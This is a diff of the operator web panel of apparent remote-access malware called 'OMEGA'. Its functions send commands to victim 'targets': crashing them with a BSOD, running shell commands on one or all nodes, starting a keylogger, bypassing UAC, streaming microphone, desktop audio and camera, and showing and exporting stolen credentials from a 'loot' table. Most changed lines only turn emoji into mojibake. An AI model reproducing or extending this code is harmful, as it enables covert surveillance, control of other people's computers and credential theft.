 		p.classList.remove("active");
 		if (p.id === `pill_${cat}`) p.classList.add("active");
@@ -1840,10 +1852,10 @@ function _showToolResult(label, text) {
 }
 
 function _confirmBsod() {
-	if (!confirm("⚠️ This will crash the target PC with a BSOD. Are you sure?"))
+	if (!confirm("âš ï¸ This will crash the target PC with a BSOD. Are you sure?"))
 		return;
 	sendTroll("bsod");
-	logEvent("💥 BSOD triggered", "warn");
+	logEvent("ðŸ’¥ BSOD triggered", "warn");
 }
 function _promptVolume() {
 	const v = prompt("Volume level (0-100):", "50");
@@ -1870,10 +1882,10 @@ function _uploadJsAsset(input, type) {
 	reader.onload = (e) => {
 		if (type === "img") {
 			customJsImg = e.target.result;
-			logEvent("🖼 Custom JS Image loaded", "ok");
+			logEvent("ðŸ–¼ Custom JS Image loaded", "ok");
 		} else {
 			customJsSnd = e.target.result;
-			logEvent("🔊 Custom JS Sound loaded", "ok");
+			logEvent("ðŸ”Š Custom JS Sound loaded", "ok");
 		}
 	};
 	reader.readAsDataURL(file);
@@ -1894,14 +1906,14 @@ function _triggerCustomJumpscare() {
 			id: currentTargetId,
 		}),
 	);
-	logEvent("🚀 Custom Jumpscare Launched!", "warn");
+	logEvent("ðŸš€ Custom Jumpscare Launched!", "warn");
 }
 
 function _promptJumpscare() {
 	const img = prompt("Jumpscare image URL (.gif or .jpg):", "");
 	if (img === null) return;
 	const snd = prompt(
-		"Jumpscare sound URL (.mp3) — leave blank for silent:",
+		"Jumpscare sound URL (.mp3) â€” leave blank for silent:",
 		"",
 	);
 	if (!currentTargetId || !socket) return;
@@ -1914,7 +1926,7 @@ function _promptJumpscare() {
 			id: currentTargetId,
 		}),
 	);
-	logEvent("👻 Jumpscare sent!", "warn");
+	logEvent("ðŸ‘» Jumpscare sent!", "warn");
 }
 function _uploadAudio(input) {
 	const file = input?.files?.[0];
@@ -1924,7 +1936,7 @@ function _uploadAudio(input) {
 	}
 	const CHUNK_B64 = 48 * 1024; // 48 KB per chunk (safe for Railway WS)
 	logEvent(
-		`📤 Sending ${file.name} (${(file.size / 1024).toFixed(0)} KB)...`,
+		`ðŸ“¤ Sending ${file.name} (${(file.size / 1024).toFixed(0)} KB)...`,
 		"ok",
 	);
 	const reader = new FileReader();
@@ -1948,7 +1960,7 @@ function _uploadAudio(input) {
 			await new Promise((r) => setTimeout(r, 30));
 		}
 		logEvent(
-			`✅ ${file.name} sent (${total} chunk${total > 1 ? "s" : ""}) — looping on target.`,
+			`âœ… ${file.name} sent (${total} chunk${total > 1 ? "s" : ""}) â€” looping on target.`,
 			"ok",
 		);
 	};
@@ -1997,7 +2009,7 @@ function _sendShell() {
 	inp.value = "";
 }
 
-// ── CHAT ──────────────────────────────────────────────────────────────────────
+// â”€â”€ CHAT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function _toggleChat() {
 	chatOpen = !chatOpen;
 	$("chatDrawer").classList.toggle("open", chatOpen);
@@ -2052,7 +2064,7 @@ function showTypingIndicator(d) {
 function renderChat(d) {
 	const stream = $("chatStream");
 	if (!stream) return;
-	// Skip SYSTEM messages — we use showSystemMsg instead
+	// Skip SYSTEM messages â€” we use showSystemMsg instead
 	if (d.username === "SYSTEM") return;
 	const isMe = d.username === currentUser?.username;
 	const wrap = document.createElement("div");
@@ -2107,7 +2119,7 @@ function renderChat(d) {
 	stream.scrollTop = stream.scrollHeight;
 }
 
-// ── ADMIN ─────────────────────────────────────────────────────────────────────
+// â”€â”€ ADMIN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let adminUsersList = [];
 async function adminLoadUsers() {
 	const el = $("adminUserList");
@@ -2157,7 +2169,7 @@ function adminUserRow(u) {
     <div style="font-size:.66rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">${u.id}</div></div>
 </div></td>
 <td><span class="badge ${roleBadge}">${u.role}</span></td>
-<td><span style="font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--text-2)">${u.ip || "—"}</span></td>
+<td><span style="font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--text-2)">${u.ip || "â€”"}</span></td>
 <td><span class="badge ${isBanned ? "badge-red" : "badge-teal"}">${isBanned ? "BANNED" : "ACTIVE"}</span></td>
 <td><div style="display:flex;gap:.375rem">
     ${!isMe && !isBanned ? `<button type="button" class="btn-primary danger" style="font-size:.7rem;padding:.3rem .6rem" onclick="adminBanUser('${u.id}',true)">Ban</button>` : ""}
@@ -2172,7 +2184,7 @@ async function _adminBanUser(id, ban) {
 		alert("You cannot ban yourself.");
 		return;
 	}
-	// Don't call adminLoadUsers() after — the server broadcasts user_update which auto-refreshes
+	// Don't call adminLoadUsers() after â€” the server broadcasts user_update which auto-refreshes
 	await fetch("/api/admin/user/update", {
 		method: "POST",
 		headers: { "Content-Type": "application/json" },
@@ -2234,7 +2246,7 @@ async function adminDeleteMsg(id) {
 	adminLoadChat();
 }
 
-// ── NODE ACCESS ───────────────────────────────────────────────────────────────
+// â”€â”€ NODE ACCESS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 async function adminLoadNodeAccess() {
 	const el = $("adminNodeAccess");
 	if (!el) return;
@@ -2259,7 +2271,7 @@ async function adminLoadNodeAccess() {
 								const isPublic = !Array.isArray(n.allowed_users);
 								return `<div onclick="adminSelectNode('${n.id}')" style="padding:.5rem .75rem;background:var(--bg-card);border:1px solid ${isPublic ? "var(--teal)" : "var(--accent)"};border-radius:8px;cursor:pointer;transition:var(--t);display:flex;flex-direction:column;gap:.15rem">
                     <div style="font-size:.72rem;font-weight:700;color:var(--text-1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.hostname || n.id}</div>
-                    <div style="font-size:.58rem;color:${isPublic ? "var(--teal)" : "var(--accent)"};font-weight:600">${isPublic ? "🌐 Public" : "🔒 Private"}</div>
+                    <div style="font-size:.58rem;color:${isPublic ? "var(--teal)" : "var(--accent)"};font-weight:600">${isPublic ? "ðŸŒ Public" : "ðŸ”’ Private"}</div>
                 </div>`;
 							})
 							.join("")}
@@ -2355,11 +2367,11 @@ window.adminToggleUserAccess = (nodeId, userId, currentlyHasAccess) => {
 	setTimeout(() => window.adminSelectNode(nodeId), 300); // refresh the panel
 };
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── NEW APEX FEATURES ──────────────────────────────────────────────────────────
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ NEW APEX FEATURES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// ── TOAST NOTIFICATION SYSTEM ────────────────────────────────────────────────
+// â”€â”€ TOAST NOTIFICATION SYSTEM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _toastContainer = null;
 function _ensureToastContainer() {
 	if (_toastContainer) return;
@@ -2396,27 +2408,27 @@ function showToast(msg, type = "ok", duration = 3500) {
 	}, duration);
 }
 
-// ── ACTIVE WINDOW HUD ─────────────────────────────────────────────────────────
-// Handle active_window response — update HUD chip if visible
+// â”€â”€ ACTIVE WINDOW HUD â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Handle active_window response â€” update HUD chip if visible
 function _handleActiveWindow(d) {
 	const title = d.title || "";
-	logEvent(`🪟 Active: ${title}`, "info");
+	logEvent(`ðŸªŸ Active: ${title}`, "info");
 	showToolResult("Active Window", title);
-	showToast(`🪟 ${title.substring(0, 60)}`, "info");
+	showToast(`ðŸªŸ ${title.substring(0, 60)}`, "info");
 }
 
-// ── SHELL AUTO-SCROLL LOCK ────────────────────────────────────────────────────
+// â”€â”€ SHELL AUTO-SCROLL LOCK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _shellScrollLocked = false;
 function _toggleShellScrollLock() {
 	_shellScrollLocked = !_shellScrollLocked;
 	const btn = $("btnScrollLock");
 	if (btn) {
-		btn.textContent = _shellScrollLocked ? "🔒 Locked" : "📜 Auto";
+		btn.textContent = _shellScrollLocked ? "ðŸ”’ Locked" : "ðŸ“œ Auto";
 		btn.style.color = _shellScrollLocked ? "var(--amber)" : "";
 	}
 }
 
-// ── NODE SEARCH / FILTER ──────────────────────────────────────────────────────
+// â”€â”€ NODE SEARCH / FILTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _nodeFilter = "";
 function filterNodes(query) {
 	_nodeFilter = (query || "").toLowerCase();
@@ -2428,7 +2440,7 @@ function filterNodes(query) {
 	});
 }
 
-// ── BATCH COMMAND (send to ALL nodes) ────────────────────────────────────────
+// â”€â”€ BATCH COMMAND (send to ALL nodes) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function sendToAll(type, extra = {}) {
 	if (!socket || !currentNodes.length) return;
 	const online = currentNodes.filter(n => n.status === "Online");
@@ -2436,8 +2448,8 @@ function sendToAll(type, extra = {}) {
 	online.forEach(n => {
 		socket.send(JSON.stringify({ type, id: n.id, ...extra }));
 	});
-	showToast(`📡 Sent to ${online.length} node(s): ${type}`, "ok");
-	logEvent(`[BATCH] ${type} → ${online.length} nodes`, "warn");
+	showToast(`ðŸ“¡ Sent to ${online.length} node(s): ${type}`, "ok");
+	logEvent(`[BATCH] ${type} â†’ ${online.length} nodes`, "warn");
 }
 function _promptBatchCmd() {
 	const cmd = prompt("Batch shell command (sent to ALL online nodes):", "");
@@ -2445,7 +2457,7 @@ function _promptBatchCmd() {
 	sendToAll("shell", { c: cmd, cmd });
 }
 
-// ── NEW PROMPT HELPERS ────────────────────────────────────────────────────────
+// â”€â”€ NEW PROMPT HELPERS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function _promptClipboardSet() {
 	const text = prompt("Text to put in clipboard:", "");
 	if (text !== null) sendCmd("clipboard_set", { text });
@@ -2470,7 +2482,7 @@ function _promptToast() {
 	if (body !== null) sendCmd("toast_notify", { title, body });
 }
 
-// ── SESSION TIMER ─────────────────────────────────────────────────────────────
+// â”€â”€ SESSION TIMER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _sessionStart = 0, _sessionTimer = null;
 function _startSessionTimer() {
 	_sessionStart = Date.now();
@@ -2491,7 +2503,7 @@ function _stopSessionTimer() {
 	if (el) el.textContent = "00:00:00";
 }
 
-// ── KEYBOARD SHORTCUT HANDLER ─────────────────────────────────────────────────
+// â”€â”€ KEYBOARD SHORTCUT HANDLER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 document.addEventListener("keydown", (e) => {
 	// Ctrl+K = batch command
 	if ((e.ctrlKey || e.metaKey) && e.key === "k" && !currentTargetId) {
@@ -2509,7 +2521,7 @@ document.addEventListener("keydown", (e) => {
 	}
 });
 
-// ── ENHANCED SHELL OUTPUT ─────────────────────────────────────────────────────
+// â”€â”€ ENHANCED SHELL OUTPUT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // Override the shell output handler to always show in the right place
 function _appendShellOutput(txt) {
 	const shellEl = $("shellOutput");
@@ -2521,7 +2533,7 @@ function _appendShellOutput(txt) {
 	showToolResult("Shell Output", txt);
 }
 
-// ── LOGS ──────────────────────────────────────────────────────────────────────
+// â”€â”€ LOGS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 function logEvent(msg, type = "info") {
 	const el = $("eventLogStream");
@@ -2538,13 +2550,13 @@ function logEvent(msg, type = "info") {
 	el.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
 	el.scrollTop = el.scrollTopMax || el.scrollHeight;
 }
-// ── DUAL AUDIO ENGINE ──────────────────────────────────────────────────────────
+// â”€â”€ DUAL AUDIO ENGINE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 const _audioCtxs = {}; // keyed: 'mic' | 'desktop'
 const _audioNext = {}; // scheduled time per context
 
 function _getAudioCtx(key) {
 	if (!_audioCtxs[key]) {
-		const rate = key === "desktop" ? 48000 : 44100;
+		const rate = 44100; // MRL fix: standardized to 44100Hz for both mic and desktop
 		_audioCtxs[key] = new (window.AudioContext || window.webkitAudioContext)({
 			sampleRate: rate,
 			latencyHint: "interactive",
@@ -2593,10 +2605,10 @@ function _getAudioChain(ctx, key) {
 function handleAudioChunk(data, key) {
 	const ctx = _getAudioCtx(key);
 	const chain = _getAudioChain(ctx, key);
-	const samples = new Int16Array(data);
+	const samples = new Int16Array(data.buffer, data.byteOffset, data.byteLength >> 1);
 	const float32 = new Float32Array(samples.length);
 	for (let i = 0; i < samples.length; i++) float32[i] = samples[i] / 32768.0;
-	const rate = key === "desktop" ? 48000 : 44100;
+	const rate = 44100; // MRL fix: standardized to 44100Hz for both mic and desktop
 	const buf = ctx.createBuffer(1, float32.length, rate);
 	buf.getChannelData(0).set(float32);
 	const now = ctx.currentTime;
@@ -2624,7 +2636,7 @@ function handleAudio(data, key = "mic") {
 	handleAudioChunk(data, key);
 }
 
-// ── DRAGGABLE CAMERA POPUP ────────────────────────────────────────
+// â”€â”€ DRAGGABLE CAMERA POPUP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 function initDraggableCam() {
 	const el = $("camContainer");
 	const header = $("camHeader");
@@ -2831,7 +2843,7 @@ function handleAudioDevices(msg) {
 			.forEach((d) => {
 				const o = document.createElement("option");
 				o.value = d.id;
-				o.textContent = `🔊 ${d.name}`;
+				o.textContent = `ðŸ”Š ${d.name}`;
 				outSel.appendChild(o);
 			});
 	}
@@ -2853,7 +2865,7 @@ function _promptSearch() {
 	if (q) sendRemoteCmd("file_search", { query: q });
 }
 
-// ── AUDIT LOGS ───────────────────────────────────────────────────────────────
+// â”€â”€ AUDIT LOGS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _auditCategory = "all";
 let _auditRefreshTimer = null;
 
@@ -2901,11 +2913,11 @@ window.renderAuditRow = (e, prepend = false) => {
         <td style="padding:.35rem .4rem">
             <span style="width:6px;height:6px;border-radius:50%;display:inline-block;background:${lvlColor};margin-right:4px;vertical-align:middle"></span>
         </td>
-        <td style="padding:.35rem .5rem;font-size:.7rem;font-weight:600;color:var(--text-1)">${e.username || "—"}</td>
-        <td style="padding:.35rem .5rem;font-size:.65rem;color:var(--text-3);font-family:'JetBrains Mono',monospace;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${e.target || ""}">${e.target || "—"}</td>
+        <td style="padding:.35rem .5rem;font-size:.7rem;font-weight:600;color:var(--text-1)">${e.username || "â€”"}</td>
+        <td style="padding:.35rem .5rem;font-size:.65rem;color:var(--text-3);font-family:'JetBrains Mono',monospace;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${e.target || ""}">${e.target || "â€”"}</td>
         <td style="padding:.35rem .5rem;font-size:.68rem;color:var(--accent);font-weight:600">${e.action || ""}</td>
         <td style="padding:.35rem .5rem;font-size:.65rem;color:var(--text-2);max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${(e.detail || "").replace(/"/g, "'")}">${e.detail || ""}</td>
-        <td style="padding:.35rem .5rem;font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">${e.ip || "—"}</td>
+        <td style="padding:.35rem .5rem;font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">${e.ip || "â€”"}</td>
     `;
 	if (prepend && tbody.firstChild) tbody.insertBefore(tr, tbody.firstChild);
 	else tbody.appendChild(tr);
@@ -2988,7 +3000,7 @@ window.loadAuditLogs = async (category = "") => {
 		const url = `/api/admin/audit-logs?limit=200${_auditCategory !== "all" ? `&category=${_auditCategory}` : ""}`;
 		const r = await fetch(url);
 		if (!r.ok) {
-			if (msg) msg.textContent = "Access denied — admin only.";
+			if (msg) msg.textContent = "Access denied â€” admin only.";
 			return;
 		}
 		const logs = await r.json();
@@ -3044,9 +3056,9 @@ function renderLoot(data) {
 			<td style="padding:.6rem;color:var(--amber);font-weight:700;font-size:.55rem">${e.type.toUpperCase()}</td>
 			<td style="padding:.6rem;color:var(--text-1);max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${e.site}">${e.site}</td>
 			<td style="padding:.6rem;color:var(--text-2)">${e.user}</td>
-			<td style="padding:.6rem;font-family:'JetBrains Mono',monospace;color:var(--teal)" data-secret="${e.secret}">••••••••</td>
+			<td style="padding:.6rem;font-family:'JetBrains Mono',monospace;color:var(--teal)" data-secret="${e.secret}">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</td>
 			<td style="padding:.6rem;text-align:center">
-				<button type="button" class="btn-ghost" style="font-size:.6rem;padding:.2rem .4rem" onclick="copyToClipboard('${e.secret}')">📋 Copy</button>
+				<button type="button" class="btn-ghost" style="font-size:.6rem;padding:.2rem .4rem" onclick="copyToClipboard('${e.secret}')">ðŸ“‹ Copy</button>
 			</td>
 		</tr>
 	`).join('');
@@ -3079,7 +3091,7 @@ async function uploadFileInChunks(file) {
 	const total = file.size;
 	let offset = 0;
 	
-	logEvent(`📤 Starting upload: ${file.name} (${(total/1024).toFixed(1)} KB)`, "info");
+	logEvent(`ðŸ“¤ Starting upload: ${file.name} (${(total/1024).toFixed(1)} KB)`, "info");
 	
 	const reader = new FileReader();
 	
@@ -3106,7 +3118,7 @@ async function uploadFileInChunks(file) {
 			if (offset < total) {
 				sendNext();
 			} else {
-				logEvent(`✅ Upload complete: ${file.name}`, "ok");
+				logEvent(`âœ… Upload complete: ${file.name}`, "ok");
 				showToast(`Uploaded ${file.name}`, "ok");
 			}
 		};
@@ -3138,7 +3150,7 @@ function exportLoot() {
 	a.download = `omega_loot_${new Date().getTime()}.json`;
 	a.click();
 	URL.revokeObjectURL(url);
-	logEvent(`📥 Exported ${data.length} credentials to JSON`, "ok");
+	logEvent(`ðŸ“¥ Exported ${data.length} credentials to JSON`, "ok");
 }
 
 function showToolResult(label, content, isHtml = false) {
@@ -3167,7 +3179,7 @@ function clearToolResult() {
 	if (out) out.innerHTML = "";
 }
 
-// ── ADVANCED TOOLS ──
+// â”€â”€ ADVANCED TOOLS â”€â”€
 function listProcesses() {
 	if (!currentTargetId || !socket) return;
 	socket.send(JSON.stringify({ type: "ps_list", id: currentTargetId }));
@@ -3203,7 +3215,7 @@ function _runUacBypass() {
 	if (!currentTargetId || !socket) return;
 	socket.send(JSON.stringify({ type: "uac_bypass", id: currentTargetId }));
 }
-// ── KEYLOGGER ──
+// â”€â”€ KEYLOGGER â”€â”€
 let klRunning = false;
 function _toggleKeylogger() {
 	if (!currentTargetId || !socket) return;
@@ -3212,20 +3224,20 @@ function _toggleKeylogger() {
 	if (klRunning) {
 		socket.send(JSON.stringify({ type: "keylog_start", id: currentTargetId }));
 		if (btn) {
-			btn.textContent = "⏹ Stop";
+			btn.textContent = "â¹ Stop";
 			btn.style.background = "rgba(248,113,113,.2)";
 		}
 		if ($("klOutput")) $("klOutput").textContent = "";
 	} else {
 		socket.send(JSON.stringify({ type: "keylog_stop", id: currentTargetId }));
 		if (btn) {
-			btn.textContent = "▶ Start";
+			btn.textContent = "â–¶ Start";
 			btn.style.background = "";
 		}
 	}
 }
 
-// ── AUDIO SURVEILLANCE (Mic / Desktop) — dual independent streams ─────────────
+// â”€â”€ AUDIO SURVEILLANCE (Mic / Desktop) â€” dual independent streams â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 let _micOn = false;
 let _deskOn = false;
 
@@ -3239,7 +3251,7 @@ function _toggleAudio(source, forceState) {
 	if (!socket || !currentTargetId) return;
 	const isMic = source === "mic";
 	const cur = isMic ? _micOn : _deskOn;
-	// forceState=false → stop. forceState=true → start. undefined → toggle
+	// forceState=false â†’ stop. forceState=true â†’ start. undefined â†’ toggle
 	const turnOn =
 		forceState === true ? true : forceState === false ? false : !cur;
 
@@ -3273,7 +3285,7 @@ function _toggleAudio(source, forceState) {
 		const lbl = $("audioSourceLabel");
 		if (lbl)
 			lbl.textContent = _micOn && _deskOn ? "MIC+DESK" : isMic ? "MIC" : "DESK";
-		logEvent(`🎙️ ${isMic ? "Mic" : "Desktop"} audio ON`, "ok");
+		logEvent(`ðŸŽ™ï¸ ${isMic ? "Mic" : "Desktop"} audio ON`, "ok");
 	} else {
 		socket.send(
 			JSON.stringify({
@@ -3308,7 +3320,7 @@ function _toggleAudio(source, forceState) {
 	}
 }
 
-// ── SESSION RECORDING ──
+// â”€â”€ SESSION RECORDING â”€â”€
 let _mediaRecorder = null,
 	_recChunks = [];
 function _toggleRecording() {
@@ -3355,7 +3367,7 @@ function _toggleRecording() {
 	logEvent("Session recording started.", "ok");
 }
 
-// ── GEOIP MAP ──
+// â”€â”€ GEOIP MAP â”€â”€
 let leafletMap = null;
 let mapMarkers = {};
 function renderMapPins() {
@@ -3424,12 +3436,12 @@ window.addEventListener("DOMContentLoaded", () => {
 	initDraggableCam();
 });
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── OMEGA WebRTC P2P ENGINE ───────────────────────────────────────────────────
-// Flow: Browser → (SDP offer via WS) → Railway → Agent → aiortc answers
-//       Browser ←  (SDP answer via WS) ← Railway ← Agent
-//       Then P2P video/audio stream goes DIRECTLY browser↔agent (no Railway relay)
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ OMEGA WebRTC P2P ENGINE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// Flow: Browser â†’ (SDP offer via WS) â†’ Railway â†’ Agent â†’ aiortc answers
+//       Browser â†  (SDP answer via WS) â† Railway â† Agent
+//       Then P2P video/audio stream goes DIRECTLY browserâ†”agent (no Railway relay)
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 // RTC_ICE already defined at top of file
 
@@ -3456,7 +3468,7 @@ function handleRtcSignal(d) {
 	if (t === "rtc_answer") {
 		_rtcPc
 			.setRemoteDescription({ type: d.type || "answer", sdp: d.sdp })
-			.then(() => _rtcLog("Remote description set ✓"))
+			.then(() => _rtcLog("Remote description set âœ“"))
 			.catch((e) => _rtcWarn(`setRemoteDescription failed: ${e}`));
 	} else if (t === "rtc_ice") {
 		if (d.candidate) {
@@ -3523,7 +3535,7 @@ async function startWebRTC() {
 				clearTimeout(_rtcTimeout);
 				_rtcTimeout = null;
 			}
-			logEvent("🟢 WebRTC P2P connected — direct stream active!", "ok");
+			logEvent("ðŸŸ¢ WebRTC P2P connected â€” direct stream active!", "ok");
 		}
 		// Audio tracks play automatically via the MediaStream
 		if (e.track.kind === "audio") {
@@ -3546,7 +3558,7 @@ async function startWebRTC() {
 		}
 
 		if (s === "failed" || s === "closed") {
-			_rtcWarn("Connection failed — falling back to JPEG stream");
+			_rtcWarn("Connection failed â€” falling back to JPEG stream");
 			_fallbackToJpeg();
 		}
 	};
@@ -3572,7 +3584,7 @@ async function startWebRTC() {
 	// Timeout: if no track in 8s, fall back to JPEG
 	_rtcTimeout = setTimeout(() => {
 		if (!_rtcActive) {
-			_rtcWarn("WebRTC timeout (8s) — falling back to JPEG stream");
+			_rtcWarn("WebRTC timeout (8s) â€” falling back to JPEG stream");
 			_fallbackToJpeg();
 		}
 	}, 8000);
@@ -3608,7 +3620,7 @@ function _fallbackToJpeg() {
 			JSON.stringify({ type: "stream", cmd: "start", id: currentTargetId }),
 		);
 	}
-	logEvent("↩️ JPEG stream fallback active", "warn");
+	logEvent("â†©ï¸ JPEG stream fallback active", "warn");
 }
 
 function _startRtcRender() {
@@ -3644,30 +3656,30 @@ function _setRtcBtn(_active, state) {
 		btn.style.background = "rgba(52,211,153,0.18)";
 		btn.style.color = "var(--teal)";
 		btn.style.borderColor = "var(--teal)";
-		btn.title = "WebRTC P2P Active — click to stop";
-		btn.textContent = "⚡ P2P ON";
+		btn.title = "WebRTC P2P Active â€” click to stop";
+		btn.textContent = "âš¡ P2P ON";
